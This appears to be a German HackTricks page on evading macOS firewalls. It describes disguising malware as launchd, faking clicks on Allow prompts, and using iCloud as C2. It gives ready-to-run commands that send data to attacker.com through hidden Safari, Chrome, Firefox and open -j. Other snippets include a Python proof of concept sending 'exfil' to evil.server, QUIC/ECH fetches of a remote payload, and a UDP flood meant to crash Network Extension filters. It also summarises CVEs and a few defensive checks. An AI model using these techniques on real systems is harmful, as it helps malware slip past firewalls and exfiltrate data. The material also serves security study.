# macOS-Umgehung von Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Gefundene Techniken

Die folgenden Techniken wurden in einigen macOS-Firewall-Apps erfolgreich eingesetzt.

### Ausnutzen von Whitelist-Namen

- Zum Beispiel die Malware nach bekannten macOS-Prozessen wie **`launchd`** benennen

### Synthetic Click

- Wenn die Firewall den Benutzer um Erlaubnis bittet, die Malware **auf „Allow“ klicken lassen**

### **Apple-signierte Binaries verwenden**

- Wie **`curl`**, aber auch andere wie **`whois`**

### Bekannte Apple-Domains

Die Firewall könnte Verbindungen zu bekannten Apple-Domains wie **`apple.com`** oder **`icloud.com`** erlauben. Außerdem könnte iCloud als C2 verwendet werden.

### Generic Bypass

Einige Ideen zum Umgehen von Firewalls

### Erlaubten Traffic prüfen

Wenn man den erlaubten Traffic kennt, kann man potenziell auf der Whitelist stehende Domains oder Anwendungen identifizieren, die auf diese zugreifen dürfen
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS missbrauchen

DNS-Auflösungen werden über die signierte Anwendung **`mdnsreponder`** durchgeführt, die wahrscheinlich berechtigt sein wird, DNS-Server zu kontaktieren.<sup>[1]</sup>

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Über Browser-Apps

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

Wenn du **Code in einen Prozess injizieren** kannst, der Verbindungen zu beliebigen Servern herstellen darf, könntest du den Firewall-Schutz umgehen:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Aktuelle Schwachstellen zur Umgehung der macOS-Firewall (2023–2025)

### Umgehung des Web content filter (Screen Time) – **CVE-2024-44206**
Im Juli 2024 behob Apple einen kritischen Fehler in Safari/WebKit, der den systemweiten „Web content filter“ für die Jugendschutzkontrollen von Screen Time außer Kraft setzte.
Eine speziell gestaltete URI (beispielsweise mit doppelt URL-kodiertem „://“) wird von der Screen-Time-ACL nicht erkannt, aber von WebKit akzeptiert, sodass die Anfrage ungefiltert gesendet wird. Jeder Prozess, der eine URL öffnen kann (einschließlich sandboxed oder unsigned code), kann dadurch auf Domains zugreifen, die vom Benutzer oder einem MDM-Profil ausdrücklich blockiert wurden.<sup>[2]</sup>

Praktischer Test (auf einem ungepatchten System):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Fehler bei der Reihenfolge von Packet-Filter-(PF-)Regeln in frühen Versionen von macOS 14 „Sonoma“
Während des macOS-14-Beta-Zyklus führte Apple eine Regression im Userspace-Wrapper um **`pfctl`** ein.
Regeln, die mit dem Schlüsselwort `quick` hinzugefügt wurden (von vielen VPN kill-switches verwendet), wurden stillschweigend ignoriert, wodurch Traffic-Leaks auftraten, selbst wenn eine VPN-/Firewall-GUI *blocked* meldete. Der Bug wurde von mehreren VPN-Anbietern bestätigt und in RC 2 (Build 23A344) behoben.

Schneller leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Missbrauch von Apple-signierten Helper-Services (legacy – pre-macOS 11.2)
Vor macOS 11.2 erlaubte die **`ContentFilterExclusionList`** etwa 50 Apple-Binaries wie **`nsurlsessiond`** und den App Store, alle mit dem Network Extension Framework implementierten Socket-Filter-Firewalls (LuLu, Little Snitch usw.) zu umgehen.
Malware konnte einfach einen ausgeschlossenen Prozess starten – oder Code in diesen injizieren – und ihren eigenen Traffic über den bereits erlaubten Socket tunneln. Apple hat die Exclusion List in macOS 11.2 vollständig entfernt, aber die Technik ist auf Systemen, die nicht aktualisiert werden können, weiterhin relevant.<sup>[3]</sup>

Beispiel für einen Proof-of-Concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH zum Umgehen von Network Extension-Domainfiltern (macOS 12+)
NEFilter Packet/Data Providers orientieren sich am TLS ClientHello SNI/ALPN. Mit **HTTP/3 über QUIC (UDP/443)** und **Encrypted Client Hello (ECH)** bleibt die SNI verschlüsselt, NetExt kann den Datenfluss nicht analysieren, und Hostname-Regeln schlagen häufig mit **fail-open** fehl, sodass Malware blockierte Domains erreichen kann, ohne DNS zu verwenden.<sup>[5]</sup>

Minimales PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Wenn QUIC/ECH weiterhin aktiviert ist, bietet dies einen einfachen Umgehungsweg für hostname-filter.

### macOS 15 „Sequoia“: Instabilität der Network Extension (2024–2025)
Frühe 15.0/15.1-Builds bringen Filter von Drittanbietern für **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne usw.) zum Absturz. Beim Neustart des Filters verwirft macOS seine Flow-Regeln, und viele Produkte arbeiten im fail-open-Modus. Das Überfluten des Filters mit Tausenden kurzen UDP-Flows (oder das Erzwingen von QUIC/ECH) kann den Absturz wiederholt auslösen und ein Zeitfenster für C2/Exfil schaffen, während die GUI weiterhin anzeigt, dass die Firewall ausgeführt wird.<sup>[4]</sup>

Schnelle Reproduktion (sichere Laborumgebung):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Tipps zu Tools für modernes macOS

1. Aktuelle PF-Regeln prüfen, die GUI-Firewalls generieren:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Binaries auflisten, die bereits das *outgoing-network*-Entitlement besitzen (nützlich zur Mitnutzung):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Eigenen Network Extension-Content-Filter programmgesteuert in Objective-C/Swift registrieren.
Ein minimales rootless PoC, das Pakete an einen lokalen Socket weiterleitet, ist im **LuLu**-Quellcode von Patrick Wardle verfügbar.

## Referenzen

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: macOS-Firewalls erstellen und brechen](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Bypass des Apple-Web-Content-Filters ermöglicht uneingeschränkten Zugriff auf blockierte Inhalte (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple entfernt macOS-Funktion, die Apps das Umgehen der Firewall-Sicherheit ermöglichte - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersicherheitsprodukte fallen nach dem macOS-Sequoia-Update aus - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Netzwerkschutz verwenden, um macOS-Verbindungen zu schädlichen Websites zu verhindern - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
